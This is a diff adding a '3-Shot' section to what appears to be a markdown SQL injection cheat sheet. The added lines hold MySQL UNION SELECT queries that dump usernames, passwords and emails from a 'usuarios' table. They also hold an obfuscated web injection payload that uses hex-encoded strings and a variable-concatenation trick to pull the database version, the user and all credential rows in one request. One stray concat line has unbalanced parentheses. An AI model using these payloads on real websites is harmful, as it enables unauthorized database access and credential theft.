@@ -125,6 +125,21 @@ SELECT GROUP_CONCAT(username,password,mail) FROM usuarios;
 -1' UniOn Select 1,2,3,(SELECT+GROUP_CONCAT(0x3c62723e,username,password,mail)+FROM (usuarios)),5,6
 ````
 
+#### 3-Shot
+
+- `MySQL` Query:
+````sql
+UNION SELECT GROUP_CONCAT(username,password,mail) FROM usuarios;
+````
+
+concat(version(),' ::: ',user(),' ::: ',database(),(SELECT * FROM usuarios WHERE CONCAT(username,password,mail));
+
+- `SQLi`: Web + Offuscation
+````py
+-1' UniOn Select 1,2,3,concat(0x416c69656e205368616e75203a3a20,version(),0x3a3a3a,user(),0x3a3a3a,database(),(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(usuarios)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,mail,0x3c62723e))))x)),5,6
+````
+
+
 ### 💉 Group Concat
 
 #### Basic
